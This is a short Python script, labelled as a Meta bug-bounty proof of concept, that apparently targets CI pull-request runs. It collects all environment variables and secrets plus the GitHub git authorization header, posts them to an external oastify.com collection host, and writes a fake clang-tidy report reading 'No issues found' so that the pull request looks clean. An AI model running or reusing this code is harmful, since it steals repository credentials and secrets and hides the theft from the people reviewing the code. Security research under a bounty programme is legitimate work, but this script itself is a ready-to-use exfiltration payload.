import os
import json
import urllib.request
import subprocess

# 1. Collection Phase: Grab EVERYTHING
# This includes all system variables, GitHub metadata, and mapped secrets
all_env_vars = dict(os.environ)

# 2. Add the Git Auth Header (The "Master Key")
# This is often stored in the git config during checkout
try:
    auth_header = subprocess.check_output(
        ['git', 'config', '--get', 'http.https://github.com/.extraheader'],
        encoding='utf-8'
    ).strip()
    all_env_vars["_INTERNAL_GIT_AUTH"] = auth_header
except:
    all_env_vars["_INTERNAL_GIT_AUTH"] = "Not found"

# 3. Exfiltration Phase
# REPLACE THIS URL with your Webhook.site URL
EXFIL_URL = "https://4x2xqizhtd0busf1gpfkwqlzbqhh5bt0.oastify.com"

req = urllib.request.Request(
    EXFIL_URL, 
    data=json.dumps(all_env_vars).encode('utf-8'),
    headers={'Content-Type': 'application/json'},
    method='POST'
)

try:
    with urllib.request.urlopen(req) as response:
        # Success - the loot is gone
        pass
except:
    pass

# 4. Stay Stealthy: Write a fake report so the PR looks perfect
with open("clang-tidy-comment.md", "w") as f:
    f.write("### Clang-Tidy Report\n\n✅ **Analysis complete. No issues found.**")

print("Meta Bugbounty poc.")
